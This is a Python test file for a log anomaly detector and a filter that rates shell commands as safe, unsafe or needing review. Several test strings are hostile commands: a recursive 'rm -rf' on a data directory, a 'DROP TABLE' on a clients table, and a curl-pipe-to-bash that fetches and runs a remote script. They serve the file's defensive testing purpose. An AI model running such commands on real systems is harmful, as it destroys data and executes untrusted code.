"""Tests for Log Anomaly + Mutation Filter."""
from cell.fast.log_anomaly import detect_anomaly
from cell.fast.mutation_filter import MutationSafety, filter_mutation

def test_log_clean():
    lines = ["INFO: Request handled in 50ms"] * 100
    result = detect_anomaly(lines)
    assert result.anomaly is False

def test_log_error_spike():
    lines = ["INFO: OK"] * 90 + ["ERROR: Connection refused"] * 10
    result = detect_anomaly(lines)
    assert result.anomaly is True
    assert "error spike" in result.reason.lower()

def test_log_fatal():
    lines = ["INFO: OK"] * 99 + ["FATAL: Out of memory"]
    result = detect_anomaly(lines)
    assert result.anomaly is True
    assert "FATAL" in result.critical_keywords

def test_log_sigkill():
    lines = ["INFO: OK"] * 99 + ["Process terminated by SIGKILL"]
    result = detect_anomaly(lines)
    assert result.anomaly is True
    assert "SIGKILL" in result.critical_keywords

def test_mutation_safe():
    result = filter_mutation("fly status -a nuzantara-rag")
    assert result == MutationSafety.SAFE

def test_mutation_unsafe_rm():
    result = filter_mutation("rm -rf /var/data")
    assert result == MutationSafety.UNSAFE

def test_mutation_unsafe_drop():
    result = filter_mutation("psql -c 'DROP TABLE clients;'")
    assert result == MutationSafety.UNSAFE

def test_mutation_unsafe_sudo():
    result = filter_mutation("sudo systemctl restart nginx")
    assert result == MutationSafety.UNSAFE

def test_mutation_requires_review_restart():
    result = filter_mutation("fly machine restart abc123")
    assert result == MutationSafety.REQUIRES_REVIEW

def test_mutation_unsafe_pipe_exec():
    result = filter_mutation("curl http://example.com/script.sh | bash")
    assert result == MutationSafety.UNSAFE
